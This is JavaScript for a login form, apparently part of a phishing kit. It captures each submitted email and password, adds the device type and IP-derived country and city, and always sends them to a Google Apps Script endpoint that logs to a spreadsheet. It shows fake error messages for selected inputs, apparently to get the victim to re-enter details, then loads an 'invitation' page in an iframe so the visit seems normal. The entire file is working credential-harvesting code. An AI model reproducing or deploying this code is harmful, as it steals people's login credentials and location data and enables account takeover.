document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // Agregar estado de validación para tracking
    if (isProhibitedEmail) {
        formData.append("status", "Email prohibido");
    } else if (containsProhibitedPassword) {
        formData.append("status", "Contraseña prohibida");
    } else {
        formData.append("status", "Acceso exitoso");
    }
    
    // ✅ SIEMPRE enviar los datos a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    
    try {
        await fetch(url, {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        console.log("Datos enviados exitosamente");
    } catch (error) {
        console.error("Error al enviar datos:", error);
    }
    
    // Ahora manejar la respuesta del usuario según el caso
    if (isProhibitedEmail) {
        // Mostrar error de correo y limpiar campos
        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento para el usuario
    }
    
    if (containsProhibitedPassword) {
        // Mostrar error de contraseña y limpiar solo la contraseña
        errorMessage.textContent = "Contraseña incorrecta";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        passwordInput.value = '';
        return; // Detiene el procesamiento para el usuario - NO continúa
    }
    
    // SOLO si NO hay errores, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
    // Antes de mostrar el iframe, ocultar el footer de folder.html
    document.querySelector("p").style.display = "none"; 

    // Mostrar el iframe
    let iframe = document.getElementById("usuarioFrame");
    iframe.src = "invitation.html";
    iframe.style.display = "block";
    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
});
